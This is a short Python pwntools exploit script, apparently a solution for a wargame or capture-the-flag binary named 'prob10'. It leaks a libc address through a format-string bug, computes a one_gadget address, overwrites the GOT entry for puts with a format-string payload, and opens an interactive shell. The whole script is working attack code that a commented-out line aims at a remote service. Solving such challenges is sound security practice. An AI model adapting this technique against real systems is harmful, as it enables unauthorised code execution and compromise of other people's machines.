from pwn import *
import subprocess
context.terminal=['tmux', 'splitw', '-h']
def get_one_gadgets():
  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).decode().split(' ')]


#p = remote('fsi.zzado.kr', 9940)
p = process('./prob10')
e = ELF('./prob10')
lib = ELF('./libc.so.6')

puts_got = e.got['puts']

context.bits = 64

p.recv()
p.send(b'%p %p %p %p %p')

dl_fini = p.recv().split(b' ')
dl_fini = int(dl_fini[4][:-3], 16)
log.info(f'dl_fini : {hex(dl_fini)}')

libc_base = dl_fini - 0x237040

ogt_offset = get_one_gadgets()
one_gadget = libc_base + ogt_offset[0] # 실패 시 ogt_offset[1] 같은 다음 인덱스로 바꿔보셈 
log.info(f'libc_base : {hex(libc_base)}')
log.info(f'one_gadget : {hex(one_gadget)}')

Writes = {puts_got: one_gadget}

payload = b''
payload += fmtstr_payload(6, Writes)

p.send(payload)

p.interactive()